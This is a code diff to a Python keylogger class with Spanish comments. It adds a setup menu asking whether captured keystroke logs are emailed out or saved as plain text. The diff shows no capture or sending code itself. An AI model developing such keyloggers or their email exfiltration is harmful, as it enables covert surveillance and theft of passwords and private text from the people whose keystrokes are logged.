@@ -31,10 +31,61 @@ class Keyloggerore:
             # de teclas que esperan su turno para ser procesadas
             running = False
             self.buffer = ""
+            
+                    
+    def mostrar_menu():
+        enviar_correo = False
+        guardar_texto_plano = False
+        
+        print("============= Configuracion del keylogger. =============")
+        print("Instrucciones: Responde 'yes'/'y' para SI, 'no'/'n' para NO, o 'exit' para salir")
+        print()
+        
+        while True:
+            print("¿Deseas enviar los registros por email?")
+            opcion_correo = input("Respuesta: ").strip().lower()
+            if opcion_correo == 'exit':
+                print("\n[x] Saliendo del programa.")
+                sys.exit(0)
+            elif opcion_correo in ['yes', 'y']:
+                enviar_correo = True
+                print("Envío por email: ACTIVADO")
+                break
+            elif opcion_correo in ['no', 'n']:
+                enviar_correo = False
+                print("Envío por email: DESACTIVADO")
+                break
+            else:
+                print("Respuesta inválida. Por favor ingresa: yes, y, no, n, o exit\n")
+        
+        print()
+        
+        while True:
+            print("¿Deseas guardar los registros en texto plano?")
+            opcion_texto = input("Respuesta: ").strip().lower()
+            
+            if opcion_texto == 'exit':
+                print("\n[x] Saliendo del programa...")
+                sys.exit(0)
+            elif opcion_texto in ['yes', 'y']:
+                guardar_texto_plano = True
+                print("Guardado en texto plano: ACTIVADO")
+                break
+            elif opcion_texto in ['no', 'n']:
+                guardar_texto_plano = False
+                print("Guardado en texto plano: DESACTIVADO")
+                break
+            else:
+                print("Respuesta inválida. Por favor ingresa: yes, y, no, n, o exit\n")
+        
+        print()
+        
+        return enviar_correo, guardar_texto_plano
         
 if __name__ == "__main__":
 
     print("============= Keylogger iniciado. =============")
+    
     logger = Keyloggerore()
     
     try:
@@ -63,11 +114,4 @@ if __name__ == "__main__":
     ### fin de example.py
     
     print("============= Keylogger detenido. =============")
-    
-    
-    
-
-        
-        
-    
 
